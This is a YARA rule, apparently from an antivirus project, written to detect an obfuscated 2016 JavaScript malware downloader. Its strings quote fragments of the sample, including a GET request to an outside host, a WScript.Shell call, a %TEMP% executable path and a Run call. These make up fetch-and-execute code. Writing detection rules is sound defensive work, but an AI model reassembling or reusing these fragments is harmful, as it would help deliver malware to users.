rule sig_20160330_cffc9e448dadea39b67c7a1d6512fdc6 {
  meta:
    description = "datamaliciousorder - file 20160330_cffc9e448dadea39b67c7a1d6512fdc6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b81699b66d9226dd5abc66502a7b63619fde8c31d0ed9d18b45d1be450cb70f7"

  strings:
    $s1  = "_I0[_B0](\"GET\", \"http://photronlamp.com/m39ska\", false);" fullword ascii
    $s2  = "function _B(_I1, _KZ){_XP = _XP * 1; return _I1 - _KZ;};" fullword ascii
    $s3  = "var _K0 = function _TG() {return WScript[_DU](\"WScript\"+\".Shell\");}(), _EH = 11;" fullword ascii
    $s4  = "if (_I0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _I(){return _NJ + \"\";};" fullword ascii
    $s6  = "function _QL() {return _K0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2ScNwINGH60VbaD.ex\" + \"e\";};" fullword ascii
    $s7  = "function _N() {return ((_IJ == true) && (_IJ == _MB)) ? 1 : _XP;};" fullword ascii
    $s8  = "function _DW(_CV){_K0[\"Run\"](_CV, _XP, _XP);};" fullword ascii
    $s9  = "function _PX(){return 22;};" fullword ascii
    $s10 = "function _N1(){return _DU;};" fullword ascii
    $s11 = "function _SM(_EU) {var _YI = (1, 2, 3, 4, 5, _EU); return _YI;};" fullword ascii
    $s12 = " while (_UL){" fullword ascii
    $s13 = "var _W0 = new this[\"Date\"]();" fullword ascii
    $s14 = "return _B(_VN, _GN);" fullword ascii
    $s15 = "function _N0()" fullword ascii
    $s16 = "var _J = false;" fullword ascii
    $s17 = "var _MB = false;" fullword ascii
    $s18 = "_MB = true; " fullword ascii
    $s19 = "var _IJ = false;" fullword ascii
    $s20 = "_IJ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}